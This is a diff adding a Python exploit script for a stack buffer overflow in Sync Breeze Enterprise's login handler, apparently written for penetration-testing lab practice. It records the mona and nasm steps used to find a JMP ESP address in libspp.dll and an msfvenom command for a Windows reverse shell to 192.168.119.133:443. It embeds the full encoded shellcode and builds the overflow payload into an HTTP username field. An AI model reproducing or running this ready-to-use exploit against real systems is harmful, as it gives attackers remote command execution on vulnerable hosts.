@@ -1,0 +1,88 @@
+#!/usr/bin/python
+
+import traceback
+
+from watchdogs.base.models import AllArgs
+from watchdogs.io.parsers import FileArgs
+from watchdogs.web.parsers import RequestArgs
+from watchdogs.web.services import RequestResponseService
+from watchdogs.web.services.RequestParserService import RequestParserService
+
+# !mona modules
+#  Address=0BADF00D
+#  Message= 0x10000000 | 0x10223000 | 0x00223000 | False  | False   | False |  False   | False  | -1.0- [libspp.dll] (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)
+
+# msf-nasm_shell
+#   nasm > jmp esp
+#   00000000  FFE4              jmp esp
+JMP_ESP = 0xFFE4
+
+#!mona find -s "\xff\xe4" -m "libspp.dll"
+#  Address=10090C83
+#  Message=  0x10090c83 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)
+JMP_ESP = 0x10090c83
+
+#msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.119.133 LPORT=443 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x25\x26\2b\x3d' -f python --smallest
+BAD_CHARS = '\x00\x0a\x0d\x25\x26\2b\x3d'
+
+def getShellCode():
+  shellcode = b""
+  shellcode += b"\xb8\xb8\x0b\x9f\x95\xd9\xf7\xd9\x74\x24\xf4\x5a\x33"
+  shellcode += b"\xc9\xb1\x52\x31\x42\x12\x83\xea\xfc\x03\xfa\x05\x7d"
+  shellcode += b"\x60\x06\xf1\x03\x8b\xf6\x02\x64\x05\x13\x33\xa4\x71"
+  shellcode += b"\x50\x64\x14\xf1\x34\x89\xdf\x57\xac\x1a\xad\x7f\xc3"
+  shellcode += b"\xab\x18\xa6\xea\x2c\x30\x9a\x6d\xaf\x4b\xcf\x4d\x8e"
+  shellcode += b"\x83\x02\x8c\xd7\xfe\xef\xdc\x80\x75\x5d\xf0\xa5\xc0"
+  shellcode += b"\x5e\x7b\xf5\xc5\xe6\x98\x4e\xe7\xc7\x0f\xc4\xbe\xc7"
+  shellcode += b"\xae\x09\xcb\x41\xa8\x4e\xf6\x18\x43\xa4\x8c\x9a\x85"
+  shellcode += b"\xf4\x6d\x30\xe8\x38\x9c\x48\x2d\xfe\x7f\x3f\x47\xfc"
+  shellcode += b"\x02\x38\x9c\x7e\xd9\xcd\x06\xd8\xaa\x76\xe2\xd8\x7f"
+  shellcode += b"\xe0\x61\xd6\x34\x66\x2d\xfb\xcb\xab\x46\x07\x47\x4a"
+  shellcode += b"\x88\x81\x13\x69\x0c\xc9\xc0\x10\x15\xb7\xa7\x2d\x45"
+  shellcode += b"\x18\x17\x88\x0e\xb5\x4c\xa1\x4d\xd2\xa1\x88\x6d\x22"
+  shellcode += b"\xae\x9b\x1e\x10\x71\x30\x88\x18\xfa\x9e\x4f\x5e\xd1"
+  shellcode += b"\x67\xdf\xa1\xda\x97\xf6\x65\x8e\xc7\x60\x4f\xaf\x83"
+  shellcode += b"\x70\x70\x7a\x03\x20\xde\xd5\xe4\x90\x9e\x85\x8c\xfa"
+  shellcode += b"\x10\xf9\xad\x05\xfb\x92\x44\xfc\x6c\x5d\x30\x89\xe9"
+  shellcode += b"\x35\x43\x75\xf3\x7e\xca\x93\x99\x90\x9b\x0c\x36\x08"
+  shellcode += b"\x86\xc6\xa7\xd5\x1c\xa3\xe8\x5e\x93\x54\xa6\x96\xde"
+  shellcode += b"\x46\x5f\x57\x95\x34\xf6\x68\x03\x50\x94\xfb\xc8\xa0"
+  shellcode += b"\xd3\xe7\x46\xf7\xb4\xd6\x9e\x9d\x28\x40\x09\x83\xb0"
+  shellcode += b"\x14\x72\x07\x6f\xe5\x7d\x86\xe2\x51\x5a\x98\x3a\x59"
+  shellcode += b"\xe6\xcc\x92\x0c\xb0\xba\x54\xe7\x72\x14\x0f\x54\xdd"
+  shellcode += b"\xf0\xd6\x96\xde\x86\xd6\xf2\xa8\x66\x66\xab\xec\x99"
+  shellcode += b"\x47\x3b\xf9\xe2\xb5\xdb\x06\x39\x7e\xeb\x4c\x63\xd7"
+  shellcode += b"\x64\x09\xf6\x65\xe9\xaa\x2d\xa9\x14\x29\xc7\x52\xe3"
+  shellcode += b"\x31\xa2\x57\xaf\xf5\x5f\x2a\xa0\x93\x5f\x99\xc1\xb1"
+
+  return shellcode
+
+def getPayload(): #type: () -> str
+  payload = b''
+  payload += b'A' * 780
+  payload += b'\x83\x0c\x09\x10'
+  payload += b'C'*4
+  payload += b'\x90'*10
+  payload += getShellCode()
+  return "username={}&password=pass".format(payload)
+
+def run():  #type: () -> None
+  allArgs = AllArgs([RequestArgs(), FileArgs()]).mergeAndProcess()
+  requestArgs = allArgs.getArgs(RequestArgs)
+  requestResponseService = RequestResponseService()
+  try:
+    request = RequestParserService().parseFile(allArgs)
+    request.setRequestBodyString(getPayload())
+
+    print("Sending Request")
+    response = requestResponseService.sendRequest(allArgs, request)
+    if (not response is None):
+      requestResponseService.handleResponse(allArgs, response)
+  except ValueError:
+    print(traceback.format_exc())
+    print(requestArgs.getParser().print_usage())
+  except Exception:
+    print(traceback.format_exc())
+    print(requestArgs.getParser().print_usage())
+
+run()
